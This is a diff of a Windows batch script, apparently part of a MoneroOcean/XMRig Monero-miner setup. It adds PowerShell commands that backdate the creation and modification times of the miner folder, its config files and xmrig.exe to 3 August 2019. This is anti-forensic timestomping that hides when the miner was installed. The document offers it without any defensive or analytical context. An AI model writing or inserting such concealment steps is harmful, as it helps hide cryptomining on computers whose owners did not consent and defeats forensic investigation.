@@ -328,14 +328,17 @@ echo :EXIT
 
 
 
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean').CreationTime=('3 August 2019 17:00:00')"
-powershell -Command "(Get-Item '%USERPROFILE%\moneroocean').LastWriteTime=('3 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\').CreationTime=('3 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\').LastWriteTime=('3 August 2019 17:00:00')"
 
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config.json').CreationTime=('3 August 2019 17:00:00')"
 powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config.json').LastWriteTime=('3 August 2019 17:00:00')"
 
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config_background.json').CreationTime=('3 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\config_background.json').LastWriteTime=('3 August 2019 17:00:00')"
 
-
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\xmrig.exe').CreationTime=('3 August 2019 17:00:00')"
+powershell -Command "(Get-Item '%USERPROFILE%\moneroocean\xmrig.exe').LastWriteTime=('3 August 2019 17:00:00')"
 
 
 
